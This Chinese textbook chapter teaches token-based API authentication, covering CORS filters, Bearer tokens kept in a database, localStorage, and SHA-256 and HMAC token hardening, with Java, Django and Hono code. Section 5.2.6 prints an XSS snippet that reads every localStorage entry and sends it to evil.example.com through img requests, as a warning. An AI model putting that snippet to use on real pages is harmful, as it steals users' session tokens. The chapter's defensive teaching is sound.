第 5 章

现代化的基于 Token 的认证

Cookie 在同域场景下很好用，但一旦客户端换成另一个域名、原生 App、或者移动端，Cookie 就开始处处碰壁——这一章教你把"认证状态"从 Cookie 里搬出来，换成更灵活也更需要你亲手加固的 Bearer Token。

设想一下：公司市场部新买了一个域名 nat.tr，想把登录页迁移过去，同时又要求老域名的 API 继续可用。你在第 4 章辛辛苦苦做好的 Session Cookie + SameSite + CSRF Token，一下子全部失灵——浏览器的同源策略（Same-Origin Policy, SOP）会直接拦掉跨域请求，Cookie 也不会被跨域的 Set-Cookie 响应头设置进浏览器。这就像你办了一张只能在本市网点使用的银行卡，现在总部要求"外地分行也要能用这张卡"——你需要先去银行谈好"跨行授权"的规则（这就是 CORS），如果还不够灵活，甚至可以换一种完全不依赖银行卡本身的认证方式（比如手机 App 里的动态令牌）——这就是本章要讲的"不用 Cookie 的 Token"。

本章分三步走：先学会用 CORS（跨域资源共享）合法地打开浏览器的"跨域大门"；再把 Token 从 Cookie 搬到数据库 + Authorization: Bearer 请求头 + 浏览器 Web Storage 的组合里；最后，因为 Token 现在明晃晃地存在数据库里，我们要像第 3 章保护密码一样，对它做哈希，再用 HMAC 加一道"防伪签名"，防止数据库被攻破后被人拿着 Token 为所欲为。

5.1用 CORS 允许跨域请求

先复习一下"源"（origin）的概念：协议 + 主机名 + 端口，三者只要有一个不同，就是不同的源。https://localhost:4567 和 https://localhost:9999 是两个源，即便它们跑在同一台机器上。浏览器的同源策略默认禁止 JavaScript 访问其他源的资源——这本是为了防止恶意网站偷看你在别的网站上的数据，但也意味着你自己的新域名想调用老域名的 API 时，同样会被拦下来。

💡 什么是 CORS

CORS（Cross-Origin Resource Sharing，跨源资源共享）是 2013 年推出的标准，让服务器可以显式地告诉浏览器"这个源的这类请求，我允许"。它不是取消同源策略，而是在同源策略的基础上开了一道"白名单闸门"：服务器返回一组特定的响应头，浏览器看到这些头之后才放行。

5.1.1 预检请求（Preflight Request）

对于那些"有点危险"的跨域请求（比如带自定义头 Authorization，或者 Content-Type: application/json 的 POST 请求），浏览器不会直接把请求发给服务器，而是先发一个"打前站"的请求去问一遍："我这个请求，你到底让不让？"这个打前站的请求就叫预检请求（preflight request），用的是 HTTP 的 OPTIONS 方法。

⚠️ 预检请求必须放在认证之前处理

预检请求（OPTIONS）永远不会带上 Cookie、Authorization 等凭证，所以如果你把 CORS 过滤器放在认证过滤器之后，预检请求会先被"未认证"挡下来，浏览器收不到 CORS 响应头，就会认为跨域请求整体被拒绝。正确顺序是：限流 → CORS → 内容类型校验 → 认证。

5.1.2 CORS 响应头一览

服务器通过一组响应头告诉浏览器"允许什么"：

Access-Control-Allow-Origin: https://nat.tr        允许的源（精确值，或 * 通配符）
Access-Control-Allow-Credentials: true             是否允许带 Cookie / TLS 客户端证书等凭证
Access-Control-Allow-Headers: Content-Type, Authorization   预检响应：允许的自定义请求头
Access-Control-Allow-Methods: GET, POST, DELETE    预检响应：允许的 HTTP 方法
Access-Control-Max-Age: 86400                      预检响应可以被浏览器缓存多久（秒）
Access-Control-Expose-Headers: X-My-Header         真实响应：额外暴露给脚本读取的响应头
Vary: Origin                                       告诉缓存这份响应只对该 Origin 有效
💡 为什么要"回显"Origin 而不是写死一个值

Access-Control-Allow-Origin 一次只能填一个值（或者通配符 *）。如果你想允许好几个不同的源，就得在服务端维护一份白名单，收到请求后把 Origin 头和白名单做精确字符串比较，命中了才把它原样"回显"回响应头里。这不是 XSS/头注入那种"未经校验就回显"的坏模式——因为比较过程是白名单精确匹配，攻击者伪造的 Origin 根本进不了这个响应。

🚨 Allow-Credentials 为 true 时不能用通配符

如果响应里带了 Access-Control-Allow-Credentials: true（意味着允许带 Cookie），那么 Access-Control-Allow-Origin 就不能是 *，必须是精确的源，否则浏览器会直接拒绝这份响应——因为"任何网站都能带着你的 Cookie 访问 API"是灾难性的。这也是本章最终选择放弃 Cookie、改用 Bearer Token 的动机之一：没有 Cookie，就不需要这条限制，Allow-Origin 甚至可以放开成 *（如果你确实想让任何网站都能调用你的公开 API）。

下面是 Natter 项目里真实的 CorsFilter：对于允许的源，先加上基础的 CORS 头；如果是预检请求，再补上允许的方法和头，并用 Spark 的 halt() 立即结束请求（预检请求不需要真正执行业务逻辑）。

ch05/.../CorsFilter.java
class CorsFilter implements Filter {
    private final Set<String> allowedOrigins;

    CorsFilter(Set<String> allowedOrigins) {
        this.allowedOrigins = allowedOrigins;
    }

    @Override
    public void handle(Request request, Response response) {
        var origin = request.headers("Origin");
        if (origin != null && allowedOrigins.contains(origin)) {
            response.header("Access-Control-Allow-Origin", origin);
            response.header("Vary", "Origin");
        }

        if (isPreflightRequest(request)) {
            if (origin == null || !allowedOrigins.contains(origin)) {
                halt(403);
            }
            response.header("Access-Control-Allow-Headers",
                    "Content-Type, Authorization");
            response.header("Access-Control-Allow-Methods",
                    "GET, POST, DELETE");
            halt(204);
        }
    }

    private boolean isPreflightRequest(Request request) {
        return "OPTIONS".equals(request.requestMethod()) &&
            request.headers().contains("Access-Control-Request-Method");
    }
}

5.2不用 Cookie 的 Token

把 CORS 打开之后，你会发现"让 Cookie 跨域工作"本身就很折腾：登录响应要带 Access-Control-Allow-Credentials: true，前端 fetch 要显式传 credentials: 'include'，还不能用 SameSite Cookie（因为 SameSite 和跨站请求本质上是互斥的）。与其和浏览器的隐私策略"死磕"，不如换一条路：彻底不用 Cookie。

Cookie 之所以好用，其实是打包了三件事：①客户端和服务器之间传递 Token 的标准方式（Cookie / Set-Cookie 头，浏览器自动处理）；②客户端本地存储 Token 的地方（Cookie Jar）；③服务器端保存 Token 状态的存储（框架内置的 Session 存储）。抛弃 Cookie，意味着这三件事都要自己重新实现一遍：

  • 服务器端状态 → 自己写一个 DatabaseTokenStore，把 Token 存进数据库；
  • 传递方式 → 用标准的 Authorization: Bearer <token> 请求头；
  • 客户端存储 → 用浏览器的 Web Storage（localStorage）。

5.2.1 把 Token 状态存进数据库

Token 的结构很简单：一个 Token ID，加上一组属性（用户名、过期时间等）。Natter 用一张表存放：

CREATE TABLE tokens(
    token_id   VARCHAR(100) PRIMARY KEY,
    user_id    VARCHAR(30) NOT NULL,
    expiry     TIMESTAMP NOT NULL,
    attributes VARCHAR(4096) NOT NULL   -- 其余属性序列化成 JSON 字符串
);
CREATE INDEX expired_token_idx ON tokens(expiry);
⚠️ Token ID 绝不能用数据库自增序列

自增 ID 是可预测的——攻击者猜到一个当前存在的 ID，就能顺着猜别人的 Token，发起会话劫持。Token ID 必须来自密码学安全的随机数生成器（Java 里是 SecureRandom，Linux 上对应 /dev/urandom 或 getrandom(2)），保证足够的"熵"（entropy）——一般建议至少 128 位，长期有效的 Token 建议 160 位以上。Natter 用 20 字节（160 位）随机数，再做 URL-safe Base64 编码得到 Token ID。

发 Token 时生成随机 ID、把属性序列化成 JSON 存进数据库；校验时按 ID 查表；登出时直接删除对应行。下面是简化版（先不看哈希，哈希是 5.3 节加的）：

ch05/.../token/DatabaseTokenStore.java（节选，去掉哈希）
public class DatabaseTokenStore implements TokenStore {
    private final Database database;
    private final SecureRandom secureRandom = new SecureRandom();

    private String randomId() {
        var bytes = new byte[20];
        secureRandom.nextBytes(bytes);
        return Base64url.encode(bytes);        // 160 位随机 Token ID
    }

    @Override
    public String create(Request request, Token token) {
        var tokenId = randomId();
        var attrs = new JSONObject(token.attributes).toString();
        database.updateUnique("INSERT INTO " +
            "tokens(token_id, user_id, expiry, attributes) " +
            "VALUES(?, ?, ?, ?)", tokenId, token.username,
                token.expiry, attrs);
        return tokenId;
    }

    @Override
    public Optional<Token> read(Request request, String tokenId) {
        return database.findOptional(this::readToken,
            "SELECT user_id, expiry, attributes " +
            "FROM tokens WHERE token_id = ?", tokenId);
    }

    @Override
    public void revoke(Request request, String tokenId) {
        database.update(
            "DELETE FROM tokens WHERE token_id = ?", tokenId);
    }
}

# tokens/store.py
def random_id() -> str:
    # secrets 模块内部用操作系统的 CSPRNG（等价 SecureRandom）
    return secrets.token_urlsafe(20)

def create_token(user, expiry, attributes) -> str:
    token_id = random_id()
    Token.objects.create(
        token_id=token_id, user=user,
        expiry=expiry, attributes=attributes,
    )
    return token_id

def read_token(token_id: str) -> Token | None:
    return Token.objects.filter(token_id=token_id).first()

def revoke_token(token_id: str) -> None:
    Token.objects.filter(token_id=token_id).delete()
src/tokens/store.ts（drizzle-orm）
import { randomBytes } from 'node:crypto'
import { db } from '../db'
import { tokens } from '../db/schema'
import { eq } from 'drizzle-orm'

function randomId(): string {
  // 20 字节（160 位）CSPRNG 随机数，等价 SecureRandom
  return randomBytes(20).toString('base64url')
}

export async function createToken(
  username: string, expiry: Date, attributes: Record<string, string>
): Promise<string> {
  const tokenId = randomId()
  await db.insert(tokens).values({
    tokenId, username, expiry, attributes: JSON.stringify(attributes),
  })
  return tokenId
}

export async function readToken(tokenId: string) {
  const [row] = await db.select().from(tokens)
    .where(eq(tokens.tokenId, tokenId))
  return row ?? null
}

export async function revokeToken(tokenId: string) {
  await db.delete(tokens).where(eq(tokens.tokenId, tokenId))
}

5.2.2 Bearer 认证方案

数据库能存 Token 了，但客户端怎么把它带回来？Natter 最初"临时"复用了第 4 章防 CSRF 用的 X-CSRF-Token 头，这显然不合适——Token 现在跟 CSRF 没关系了。标准做法是 RFC 6750 定义的 Bearer 认证方案：

Authorization: Bearer QDAmQ9TStkDCpVK5A9kFowtYn2k
💡 什么是 Bearer Token

"Bearer"字面意思是"持有人"——谁拿着这个 Token，谁就能用它访问 API，不需要再证明别的身份。这既是它的优点（简单、无状态传递、方便第三方临时使用），也是它的风险（一旦泄漏，任何拿到它的人都能冒充你，直到它过期或被撤销）。Bearer 最初是为 OAuth2（第 7 章）设计的，但现在已经是 API Token 认证的事实标准。

校验逻辑：检查 Authorization 头是否以 "Bearer "（注意有个空格）开头，取后面的部分作为 Token ID；如果没有这个头，就放行给别的认证方式（比如登录接口用的 HTTP Basic）处理。如果 Token 已过期，返回带 WWW-Authenticate 的 401，标准地告诉客户端"该重新登录了"：

HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer realm="users", error="invalid_token",
        error_description="Token has expired"
ch05/.../controller/TokenController.java
public JSONObject login(Request request, Response response) {
    String subject = request.attribute("subject");   // Basic 认证已校验过密码
    var expiry = now().plus(10, ChronoUnit.MINUTES);

    var token = new TokenStore.Token(expiry, subject);
    var tokenId = tokenStore.create(request, token);

    response.status(201);
    return new JSONObject().put("token", tokenId);
}

public void validateToken(Request request, Response response) {
    var tokenId = request.headers("Authorization");
    if (tokenId == null || !tokenId.startsWith("Bearer ")) {
        return;                       // 不是 Bearer，交给其他认证方式
    }
    tokenId = tokenId.substring(7);

    tokenStore.read(request, tokenId).ifPresent(token -> {
        if (now().isBefore(token.expiry)) {
            request.attribute("subject", token.username);
            token.attributes.forEach(request::attribute);
        } else {
            response.header("WWW-Authenticate",
                "Bearer error=\"invalid_token\"," +
                "error_description=\"Expired\"");
        }
    });
}

public JSONObject logout(Request request, Response response) {
    var tokenId = request.headers("Authorization");
    if (tokenId == null || !tokenId.startsWith("Bearer ")) {
        throw new IllegalArgumentException("missing token header");
    }
    tokenId = tokenId.substring(7);
    tokenStore.revoke(request, tokenId);
    response.status(200);
    return new JSONObject();
}
tokens/authentication.py（DRF 自定义 TokenAuthentication）
from datetime import datetime, timezone
from rest_framework.authentication import BaseAuthentication
from rest_framework.exceptions import AuthenticationFailed
from .store import read_token, create_token, revoke_token

class BearerTokenAuthentication(BaseAuthentication):
    """等价于 Java 的 TokenController.validateToken"""

    def authenticate(self, request):
        header = request.headers.get("Authorization")
        if not header or not header.startswith("Bearer "):
            return None                     # 不是 Bearer，交给其他方式
        token_id = header[len("Bearer "):]

        token = read_token(token_id)
        if token is None:
            return None
        if token.expiry < datetime.now(timezone.utc):
            raise AuthenticationFailed(
                "Token has expired",
                code="invalid_token",
            )   # DRF 会把 WWW-Authenticate: Bearer 加到 401 响应
        return (token.user, token)


# views.py —— 登录、登出接口
class LoginView(APIView):
    authentication_classes = [BasicAuthentication]  # 用户名密码走 Basic

    def post(self, request):
        expiry = datetime.now(timezone.utc) + timedelta(minutes=10)
        token_id = create_token(request.user, expiry, {})
        return Response({"token": token_id}, status=201)

class LogoutView(APIView):
    authentication_classes = [BearerTokenAuthentication]

    def delete(self, request):
        header = request.headers["Authorization"]
        revoke_token(header[len("Bearer "):])
        return Response({})
src/middleware/bearerAuth.ts（自定义中间件，基于 hono/bearer-auth 思路）
import { Context, Next } from 'hono'
import { createToken, readToken, revokeToken } from '../tokens/store'

// 等价于 Java 的 TokenController.validateToken，
// 注册为 app.use('*', bearerAuth) 的 before 过滤器
export async function bearerAuth(c: Context, next: Next) {
  const header = c.req.header('Authorization')
  if (!header || !header.startsWith('Bearer ')) {
    return next()               // 不是 Bearer，放行给其他认证方式
  }
  const tokenId = header.slice('Bearer '.length)

  const token = await readToken(tokenId)
  if (token && token.expiry > new Date()) {
    c.set('subject', token.username)
    for (const [k, v] of Object.entries(token.attributes)) c.set(k, v)
  } else if (token) {
    c.header('WWW-Authenticate',
      'Bearer error="invalid_token", error_description="Expired"')
  }
  await next()
}

// src/routes/sessions.ts
app.post('/sessions', async (c) => {          // 登录：Basic 校验后签发
  const subject = c.get('subject') as string
  const expiry = new Date(Date.now() + 10 * 60 * 1000)
  const tokenId = await createToken(subject, expiry, {})
  return c.json({ token: tokenId }, 201)
})

app.delete('/sessions', async (c) => {         // 登出：撤销 Token
  const header = c.req.header('Authorization')
  if (!header?.startsWith('Bearer ')) {
    return c.json({ error: 'missing token header' }, 400)
  }
  await revokeToken(header.slice('Bearer '.length))
  return c.json({})
})

5.2.3 删除过期 Token

Token 不会自己消失——数据库里的行会一直堆积，既浪费空间，也可能被攻击者利用（反复登录制造大量 Token，撑爆存储，属于一种 DoS）。解决方式很简单：定期跑一条 DELETE：

public void deleteExpiredTokens() {
    var deleted = database.update(
        "DELETE FROM tokens WHERE expiry < current_timestamp");
    logger.info("Deleted {} expired tokens", deleted);
}

// 构造函数里注册一个每 10 分钟跑一次的定时任务：
Executors.newSingleThreadScheduledExecutor()
    .scheduleAtFixedRate(this::deleteExpiredTokens, 10, 10, TimeUnit.MINUTES);

配合 expiry 列上的索引（CREATE INDEX expired_token_idx ON tokens(expiry)），这条删除语句不需要全表扫描。生产环境里，你可能会用 Django 的 celery beat 定时任务或 Kubernetes CronJob，或者 Node.js 里的 node-cron / 平台自带的定时触发器来替代 Java 的 ScheduledExecutorService——原理是一样的：周期性地跑一条清理语句，并对暴露出来的清理接口加限流或权限校验。

5.2.4 把 Token 存进 Web Storage

Token 服务端搞定了，客户端呢？浏览器早年除了 Cookie 没有别的持久化选择，HTML5 之后多了两个新工具挂在 window 对象上：

  • sessionStorage —— 数据只在当前标签页存活，关闭标签页就没了，标签页之间互不共享；
  • localStorage —— 数据持久保存直到显式删除，连浏览器重启都还在，是本章的选择。

两者接口一样：setItem(key, value)、getItem(key)、removeItem(key)。相比操作 Cookie 要手写字符串解析，Web Storage 的 API 简单得多：

// 登录成功后保存 Token
localStorage.setItem('token', json.token);

// 每次请求前取出 Token
let token = localStorage.getItem('token');
fetch(apiUrl + '/spaces', {
    method: 'POST',
    body: JSON.stringify(data),
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + token
    }
    // 不再需要 credentials: 'include'，因为不依赖浏览器自动带 Cookie
})

到这一步，三种"Cookie 提供的能力"就都有了对应的替代品。放在一起对比一下三种存储位置的取舍：

5.2.5 更新 CORS 过滤器

既然不再依赖 Cookie，很多为 Cookie 而加的 CORS 限制就可以去掉了：Access-Control-Allow-Credentials 不再需要（因为浏览器不用自动附带任何凭证），X-CSRF-Token 也可以从允许的头列表里删除。前端 fetch 也要相应去掉 credentials: 'include'——如果不去掉，浏览器发现服务器不再返回 Allow-Credentials，反而会把整个请求拦截掉。

ch05/.../CorsFilter.java（去 Cookie 后的版本）
@Override
public void handle(Request request, Response response) {
    var origin = request.headers("Origin");
    if (origin != null && allowedOrigins.contains(origin)) {
        response.header("Access-Control-Allow-Origin", origin);
        response.header("Vary", "Origin");
        // 不再需要 Access-Control-Allow-Credentials
    }

    if (isPreflightRequest(request)) {
        if (origin == null || !allowedOrigins.contains(origin)) {
            halt(403);
        }
        response.header("Access-Control-Allow-Headers",
                "Content-Type, Authorization");  // 去掉 X-CSRF-Token
        response.header("Access-Control-Allow-Methods",
                "GET, POST, DELETE");
        halt(204);
    }
}

5.2.6 Web Storage 上的 XSS 风险

Web Storage 解决了 CSRF（因为浏览器不会自动把 Token 附加到请求上），但引入了新的风险：Cookie 可以设置 HttpOnly，让 JavaScript 完全读不到；localStorage / sessionStorage 天生就是给 JavaScript 用的，没有"只读不给脚本看"这个选项。一旦页面存在 XSS 漏洞，攻击者的脚本可以直接把 Token 读出来，"打包快递"发到自己的服务器。

🚨 攻击示例：用 <img> 标签隐蔽窃取 Token

攻击者不需要发起显式的网络请求（容易被 CSP 或网络监控发现），只需要动态创建 <img> 元素——浏览器加载图片资源时会自动发起 GET 请求，哪怕这个 <img> 从未被插入到页面里：

for (var i = 0; i < localStorage.length; ++i) {
    var key = localStorage.key(i);
    var img = document.createElement('img');
    img.setAttribute('src',
        'https://evil.example.com/exfil?key=' +
           encodeURIComponent(key) + '&value=' +
           encodeURIComponent(localStorage.getItem(key)));
    // 注意：这里甚至没有 document.body.appendChild(img)
}

整个过程用户毫无感知——没有弹窗，没有页面跳转，Token 就已经出现在攻击者服务器的访问日志里了。

✅ 没有 XSS 就没有这类风险；但 XSS 面前所有客户端存储都不安全

即使把 Token 存在 HttpOnly Cookie 里，XSS 攻击者也可以不窃取 Token，而是直接在受害者浏览器里"就地"发起请求——反正浏览器会自动带上 Cookie，这样连 CSRF 防护都绕过去了。所以本章的结论和第 2 章一致：防止 XSS 永远是第一优先级，Token 存储方式的选择只是"XSS 已经发生后损失有多大"的权衡，不是能替代 XSS 防护的方案。Content-Security-Policy（CSP）是目前最有效的纵深防御手段。

5.3加固数据库 Token 存储

Token 现在明文存在数据库里。假设攻击者通过 SQL 注入或者直接拿到了数据库访问权限——这不是耸人听闻，第 2 章已经讲过 SQL 注入的威力——那么数据库里当前所有在线用户的 Token 都会暴露，攻击者能直接拿着这些 Token 冒充任何一个用户，影响范围远超"单个用户密码泄漏"。

5.3.1 对数据库里的 Token 做哈希

解法和第 3 章保护密码的思路一模一样：不要在数据库里存明文 Token，存它的哈希值。校验时把客户端传来的 Token 也哈希一遍，去数据库比对哈希值。这样即使数据库泄漏，攻击者拿到的只是一堆哈希，无法反推出原始 Token（哈希函数不可逆）。

✅ Token 哈希不需要 Scrypt/Argon2 这种"慢哈希"

第 3 章给密码加密用的是故意设计得很慢的算法（Scrypt/Argon2/PBKDF2），因为密码的熵很低（人类记得住的密码往往只有二三十比特的实际强度），需要用"慢"来抵消暴力枚举。而 Token 是机器生成的 160 位随机数，熵本身就很高，用普通的快速密码学哈希（比如 SHA-256）已经足够安全，还能保证每次请求的校验开销很低。

import static com.manning.apisecurityinaction.token.CookieTokenStore.sha256;

@Override
public String create(Request request, Token token) {
    var tokenId = randomId();                     // 明文，返回给客户端
    var attrs = new JSONObject(token.attributes).toString();

    database.updateUnique("INSERT INTO " +
        "tokens(token_id, user_id, expiry, attributes) " +
        "VALUES(?, ?, ?, ?)", hash(tokenId), token.username,
            token.expiry, attrs);                 // 存哈希，不存明文

    return tokenId;
}

@Override
public Optional<Token> read(Request request, String tokenId) {
    return database.findOptional(this::readToken,
        "SELECT user_id, expiry, attributes " +
        "FROM tokens WHERE token_id = ?", hash(tokenId));
}

@Override
public void revoke(Request request, String tokenId) {
    database.update("DELETE FROM tokens WHERE token_id = ?",
        hash(tokenId));
}

private String hash(String tokenId) {
    var hash = sha256(tokenId);           // 复用 CookieTokenStore 的 SHA-256
    return Base64url.encode(hash);
}
tokens/store.py
import hashlib, base64

def _hash(token_id: str) -> str:
    # SHA-256 足够：Token 本身已有 160 位熵，不需要 Argon2 那种慢哈希
    digest = hashlib.sha256(token_id.encode("utf-8")).digest()
    return base64.urlsafe_b64encode(digest).decode().rstrip("=")

def create_token(user, expiry, attributes) -> str:
    token_id = random_id()                    # 明文，返回给客户端
    Token.objects.create(
        token_id=_hash(token_id),              # 数据库列存哈希
        user=user, expiry=expiry, attributes=attributes,
    )
    return token_id

def read_token(token_id: str) -> Token | None:
    return Token.objects.filter(token_id=_hash(token_id)).first()

def revoke_token(token_id: str) -> None:
    Token.objects.filter(token_id=_hash(token_id)).delete()
src/tokens/store.ts
import { createHash, randomBytes } from 'node:crypto'

function hash(tokenId: string): string {
  // Web Crypto: crypto.subtle.digest('SHA-256', ...) 也可以，
  // 这里用 Node crypto 保持同步、简单
  return createHash('sha256').update(tokenId).digest('base64url')
}

export async function createToken(
  username: string, expiry: Date, attributes: Record<string, string>
): Promise<string> {
  const tokenId = randomBytes(20).toString('base64url')   // 明文返回
  await db.insert(tokens).values({
    tokenId: hash(tokenId),                                // 存哈希
    username, expiry, attributes: JSON.stringify(attributes),
  })
  return tokenId
}

export async function readToken(tokenId: string) {
  const [row] = await db.select().from(tokens)
    .where(eq(tokens.tokenId, hash(tokenId)))
  return row ?? null
}

export async function revokeToken(tokenId: string) {
  await db.delete(tokens).where(eq(tokens.tokenId, hash(tokenId)))
}

5.3.2 用 HMAC 认证 Token

光做哈希，防得住"数据库被读走后 Token 被冒用"，但防不住写权限：攻击者如果能往 tokens 表里插入一行"伪造"的记录（比如通过一个允许写入的注入点），照样能构造出一个合法能用的 Token——因为服务器只是"哈希后查表"，并不关心这一行是不是服务器自己插入的。另外，普通数据库查询的等值比较通常不是"常数时间"的，理论上可能被用于第 4 章讲过的时序攻击（timing attack）来推测哈希值。

解决办法是引入 HMAC（Hash-based Message Authentication Code，基于哈希的消息认证码）——一个带密钥的哈希函数。没有密钥的人，即使知道算法，也算不出正确的认证标签（tag）；哪怕只改动 Token 里的一个比特，算出来的 tag 也会截然不同。

💡 哈希 vs. HMAC：多了什么

普通哈希函数（SHA-256）任何人都能计算，只能保证"内容没变"；HMAC 额外引入一把只有服务器知道的密钥，能保证"这个值是持有密钥的服务器亲自算出来的"——也就是从"防篡改检测"升级到了"防伪造认证"。这和第 3 章的密码哈希不是一回事：密码哈希是为了不可逆地存储凭证，HMAC 是为了给一段数据盖一个"官方防伪印章"。

Natter 的做法很巧妙：不改数据库里存的内容，只在"要把 Token 交给客户端的最后一刻"，用 HMAC 给它算一个 tag，拼在 Token ID 后面（用 . 分隔）一起发给客户端；客户端以后每次都要把"Token ID + tag"整体带回来；服务器先验证 tag 是否合法，验证通过才去掉 tag、把裸的 Token ID 交给 DatabaseTokenStore（也就是先前的哈希版本）去查库。tag 校验失败就直接拒绝，连数据库都不用查——这正好顺便解决了时序攻击的问题。

ch05/.../token/HmacTokenStore.java
public class HmacTokenStore implements TokenStore {
    private final TokenStore delegate;     // 包住的是 DatabaseTokenStore
    private final Key macKey;

    public HmacTokenStore(TokenStore delegate, Key macKey) {
        this.delegate = delegate;
        this.macKey = macKey;
    }

    @Override
    public String create(Request request, Token token) {
        var tokenId = delegate.create(request, token);
        var tag = hmac(tokenId);
        return tokenId + '.' + Base64url.encode(tag);
    }

    private byte[] hmac(String tokenId) {
        var mac = Mac.getInstance(macKey.getAlgorithm());
        mac.init(macKey);
        return mac.doFinal(tokenId.getBytes(StandardCharsets.UTF_8));
    }

    @Override
    public Optional<Token> read(Request request, String tokenId) {
        var index = tokenId.lastIndexOf('.');
        if (index == -1) return Optional.empty();
        var realTokenId = tokenId.substring(0, index);

        var provided = Base64url.decode(tokenId.substring(index + 1));
        var computed = hmac(realTokenId);

        if (!MessageDigest.isEqual(provided, computed)) {   // 常数时间比较
            return Optional.empty();          // 不合法，连数据库都不查
        }
        return delegate.read(request, realTokenId);
    }
    // revoke() 同理：先验证 tag，再委托给 delegate.revoke()
}

tokens/hmac_store.py
import hmac as hmac_lib, hashlib, base64

class HmacTokenStore:
    """包住 store.py 里的裸 DatabaseTokenStore 函数"""

    def __init__(self, mac_key: bytes):
        self.mac_key = mac_key       # 从密钥管理服务/环境变量加载

    def _tag(self, token_id: str) -> bytes:
        return hmac_lib.new(
            self.mac_key, token_id.encode("utf-8"), hashlib.sha256
        ).digest()

    def create(self, user, expiry, attributes) -> str:
        token_id = create_token(user, expiry, attributes)   # 委托
        tag = self._tag(token_id)
        encoded_tag = base64.urlsafe_b64encode(tag).decode().rstrip("=")
        return f"{token_id}.{encoded_tag}"

    def read(self, token_id: str):
        if "." not in token_id:
            return None
        real_id, encoded_tag = token_id.rsplit(".", 1)
        provided = base64.urlsafe_b64decode(encoded_tag + "==")
        computed = self._tag(real_id)

        # hmac.compare_digest 是 Python 标准库的常数时间比较
        if not hmac_lib.compare_digest(provided, computed):
            return None                     # 直接拒绝，不查数据库
        return read_token(real_id)           # 委托给裸 store

    def revoke(self, token_id: str) -> None:
        real_id, encoded_tag = token_id.rsplit(".", 1)
        provided = base64.urlsafe_b64decode(encoded_tag + "==")
        if not hmac_lib.compare_digest(provided, self._tag(real_id)):
            return
        revoke_token(real_id)
src/tokens/hmacStore.ts
import { createHmac, timingSafeEqual } from 'node:crypto'
import * as db from './store'          // 裸的 DatabaseTokenStore 版本

export class HmacTokenStore {
  constructor(private macKey: Buffer) {}   // 32 字节密钥，来自密钥管理服务

  private tag(tokenId: string): Buffer {
    return createHmac('sha256', this.macKey).update(tokenId).digest()
  }

  async create(username: string, expiry: Date, attrs: Record<string, string>) {
    const tokenId = await db.createToken(username, expiry, attrs)  // 委托
    const encodedTag = this.tag(tokenId).toString('base64url')
    return `${tokenId}.${encodedTag}`
  }

  async read(tokenId: string) {
    const idx = tokenId.lastIndexOf('.')
    if (idx === -1) return null
    const realId = tokenId.slice(0, idx)
    const provided = Buffer.from(tokenId.slice(idx + 1), 'base64url')
    const computed = this.tag(realId)

    // timingSafeEqual：Node crypto 提供的常数时间比较
    if (provided.length !== computed.length ||
        !timingSafeEqual(provided, computed)) {
      return null                     // 直接拒绝，不查数据库
    }
    return db.readToken(realId)        // 委托给裸 store
  }

  async revoke(tokenId: string) {
    const idx = tokenId.lastIndexOf('.')
    if (idx === -1) return
    const realId = tokenId.slice(0, idx)
    const provided = Buffer.from(tokenId.slice(idx + 1), 'base64url')
    if (!timingSafeEqual(provided, this.tag(realId))) return
    await db.revokeToken(realId)
  }
}

密钥从哪来？绝不能硬编码在代码里，也不能用一个"人类记得住"的密码充当（HMAC 密钥应该是 32 字节的纯随机数据）。Natter 用 Java 自带的 keytool 生成一个 PKCS#12 格式的密钥库文件，运行时通过系统属性传入密码解锁：

# 生成一个 256 位的 HMAC 密钥，存进 PKCS#12 密钥库
keytool -genseckey -keyalg HmacSHA256 -keysize 256 \
    -alias hmac-key -keystore keystore.p12 \
    -storetype PKCS12 -storepass changeit

# 启动时通过系统属性传密码，不写进源码里
$ mvn ... -Dkeystore.password=changeit
⚠️ 多实例部署时，所有服务器必须用同一把密钥

如果 API 由多台服务器组成集群，某个用户的请求可能被路由到任意一台，它们都必须用同一把 HMAC 密钥，否则用一台服务器签发的 Token 会被另一台拒绝。同理，单台服务器如果每次重启都随机生成新密钥，重启前签发的所有 Token 会集体失效。正确做法是把密钥集中存放在密钥库或密钥管理服务（KMS）里，让所有实例加载同一份。

Django 和 Hono 生态里没有和 keytool + PKCS#12 完全对应的工具，但思路一致：密钥要来自专门的密钥管理服务或者部署环境注入的 Secret（比如 Kubernetes Secret、AWS Secrets Manager、Django 的 SECRET_KEY 派生密钥），绝不写进代码仓库，绝不用弱密码代替随机密钥。

5.3.3 保护敏感属性

如果 Token 的属性字段里存了敏感信息（比如登录时的地理位置，用来做异常登录检测），数据库一旦泄漏，这些隐私信息也会一并暴露。书中提到可以对这些属性做加密，但这是一个复杂话题（尤其是加密后还要支持查询/索引时），不在本章展开。更实际的做法，是继续做好数据库访问控制这一层：

  • 给"批量清理过期 Token"这类破坏性操作单独开一个数据库账号，不要让处理普通 API 请求的账号拥有这些权限——这和 CQRS（命令查询职责分离）的思路一致：查询和更新走不同的账号/不同的路径，即使某个账号被注入攻破，影响面也被限制住；
  • 有条件的话，用支持行级安全策略（Row-Level Security）的数据库（比如 PostgreSQL），限制每次查询只能看到"当前用户自己的" Token 行，即便 SQL 注入拿到了查询权限，也读不到别人的数据。

本章小结

知识点要点
CORS 预检请求浏览器对"非简单"跨域请求先发 OPTIONS 打前站，服务器用 Access-Control-Allow-* 系列响应头决定是否放行，CORS 过滤器要排在认证之前处理。
Origin 白名单Access-Control-Allow-Origin 一次只能填一个值；要支持多个源，服务器需精确匹配请求的 Origin 头后再"回显"，并搭配 Vary: Origin。
DatabaseTokenStore用 SecureRandom 生成 160 位随机 Token ID，属性序列化成 JSON 存进数据库；定期删除过期 Token 防止无限增长。
Bearer 认证方案标准的 Authorization: Bearer <token>，配合 WWW-Authenticate: Bearer error="invalid_token" 响应挑战头，替代自造的 X-CSRF-Token。
Web StoragelocalStorage 持久存储、简单易用，但没有类似 HttpOnly 的保护，一旦 XSS 就可能被整体窃取；防 XSS 始终是第一优先级。
Token 哈希数据库里只存 SHA-256 哈希，不存明文；因为 Token 本身熵高，不需要 Scrypt/Argon2 这类慢哈希。
HMAC 防伪用带密钥的 HMAC-SHA256 给发给客户端的 Token 追加认证标签，能挡住"写权限伪造 Token"和数据库层面的时序攻击；密钥必须集中存放在密钥库/KMS 里，且所有服务器共享同一把。
